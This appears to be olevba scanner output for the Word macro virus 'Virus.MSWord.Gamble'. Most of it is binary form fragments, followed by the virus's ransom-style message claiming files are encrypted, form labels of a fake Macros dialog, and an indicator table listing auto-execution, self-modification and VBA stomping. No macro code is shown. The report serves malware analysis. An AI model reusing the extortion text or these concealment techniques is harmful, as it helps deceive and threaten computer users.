- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g3H;ʵ(4׆Զ���tJ}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
xL���h�P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8~�mc�wH
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:�(7�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�C�L�X���5��u�5�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�#�xb�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�a�8����@�`S�?Ø�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t��jɸf��9�EA}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�%�W��g�'z2t�˔�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X�HWڈB�c�^�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�h|E�T��\pt��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
aK1��4�%R?	4�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ax�l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
EEh�*U�t���8u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�+����{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�a��#��EH
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
EÆ]��+?H�[T-gf�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I"(#�k�j$J1�i'�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*%�'��Y(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a;ɓNWp�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y/��%��>9�"+�=*Ɍ:�P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��7��d,Ui�w�"ٔ��U�^��`I��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�=Ɋj��l9I�823ij/iTy�s-	��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Yh�w�Yv����5��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
٘�w���VK��$y�n�V���oE�eF��&��I�иT�ɂ��v��uT���ՙ���6iP�醭Y�Kyb���i�Kr���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I��)�D�����.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�NU���Y��Щa�rv�&�L5�ÉMaI���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
WS��[��y$�ڙ��əΩ�牚)�~�I��)��	~�)���H�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^��Wߩ�ꉞ�HY�7��i`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*�"��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���E�Ue�{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ʡ9UYr�8�%�Gu��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:7'��ɟ�X�$��H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�)�;J��	p1��
��*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r��i�f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��y�NڍLJJ6�^`ɣ?
�Qj`��U�y4[�W�8���}D��5�Bd�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��J
Z��[3:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ݹjv�QY�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�fZ�,ZS4
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s�t�D	�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z���9�6��XxyȘ���<�Y<ըm*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G��zDK
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Z��z��������ڪ����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��:��Z��z��������ګ����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��:��Z��z�Ț�ʺ��ڬ����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��:��Z��z�ؚ�ں�r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�You System Is Infected By "The Gambler" Word Macro Virusk
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I Will Give You One Chance To Save Your Files, If You Can Guess The correct Number between 1 And 10, I Will Return Your System To Your Control 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�If Your Wrong, Well We Won't Go There. Do Not Not Turn Your System Off. Your system Files Have Been Encrypted With A Random Number, If This Is Not Completed Your System Will Not Be Able To Reboot. Just Play Along And Hope Your A Good Guess.                                                                                                                                 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�HERE�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�When Your ready To Play Press HereM
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Macro Name:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Macros in:K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Cancel@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Step Into�I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Edit�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Create@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Delete@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Organizer...�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Description:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userForm998'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton5'" IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton6'" IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton7'" IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox2'" IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox1'" IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox4'" IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox3'" IN 'Virus.MSWord.Gamble' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CommandButton2_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Hex String|33?3                |33333f33                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

